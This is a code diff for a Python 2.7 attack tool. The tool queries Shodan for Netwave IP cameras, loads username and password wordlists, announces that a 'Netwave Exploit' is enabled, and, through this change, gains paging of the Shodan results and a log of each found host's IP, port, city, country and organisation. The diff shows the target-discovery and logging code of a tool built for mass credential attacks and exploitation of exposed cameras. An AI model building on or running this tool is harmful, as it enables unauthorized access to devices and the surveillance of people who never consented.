@@ -1,5 +1,7 @@
 #!/usr/bin/python2.7
 
+# -*- coding: utf-8 -*-
+
 import argparse
 import sys,os,time
 import subprocess
@@ -43,8 +45,14 @@ def main() :
  parser.add_argument('-u','--username', dest="username",  type=file, help='Select your usernames wordlist')
  parser.add_argument('-w','--wordlist', dest="password",  type=file, help='Select your passwords wordlist')
  parser.add_argument('-k','--shodan', dest="address", default='', type=str, help='Shodan API key')
+ parser.add_argument('-t','--output', dest="output", default='', type=str, help='Log File')
+ parser.add_argument('-l','--limit', dest="limit", type=str, help='Limit the number of registers responsed by Shodan')
+ parser.add_argument('-o','--offset', dest="offset", type=str, help='Shodan skips this number of registers from response')
+
  args = parser.parse_args()
 
+ global filename
+ filename = args.output
 
  try:
 
@@ -68,7 +76,7 @@ def main() :
  signal.signal(signal.SIGINT, signal_handler)
 
  def NetworkSearchosts():
-
+  
   exploit = True
   found = False
 
@@ -92,12 +100,12 @@ def main() :
   try:
 
    shodanapi = shodan.Shodan(args.address)
-   api = shodanapi.search(args.search)
+   api = shodanapi.search(args.search, limit = args.limit, offset = args.offset)
    total = api.get('total')
 
    usernames = args.username.readlines()
    passwords = args.password.readlines()
-
+   
    print(backgroundColor.OKGREEN + "[+] Shodan successfully Connected."+ backgroundColor.ENDC)
    print(backgroundColor.OKGREEN + "[+] Netwave Exploit Enabled."+ backgroundColor.ENDC)
    print(backgroundColor.OKGREEN + "[+] Netwave IP Camera Found: %d" % (total) + backgroundColor.ENDC)
@@ -115,11 +123,11 @@ def main() :
 
      host = hosts.get('ip_str')
      port = hosts.get('port')
-     country = hosts.get('country', 'n/a')
+     city = hosts['location']['city'] or 'n/a'
+     country = hosts['location']['country_name'] or 'n/a'
      org = hosts.get('org', 'n/a')
      hostnames = hosts.get('hostnames', 'n/a')
      product = hosts.get('product', 'n/a')
-
 
      try:
 
@@ -247,7 +255,9 @@ def main() :
      except Exception as e:
       print("Error : %s" % (e))
 
-     print("""[+] Host: http://%s:%s\n[+] Country: %s\n[+] Organization: %s\n[+] Product: %s""" % (host, port, country, org, product))
+     print("""[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s""" % (host, port, country, city, org, product))
+
+     log(host, port, country, city, org, product)
 
      try:
 
@@ -325,6 +335,18 @@ def main() :
    sys.exit(0)
 
  NetworkSearchosts()
+
+
+
+def log(host, port, country, city, org, product):
+
+ file = open(filename, 'a')
+ out = "[+] Host: http://%s:%s\n[+] Country: %s\n[+] City: %s\n[+] Organization: %s\n[+] Product: %s\n" % (host, port, country, city, org, product)
+ file.write(out.encode('utf-8'))
+ file.write("*****************" + "\n")
+ file.close()
+
+
 
 if __name__ == "__main__" :
  main()
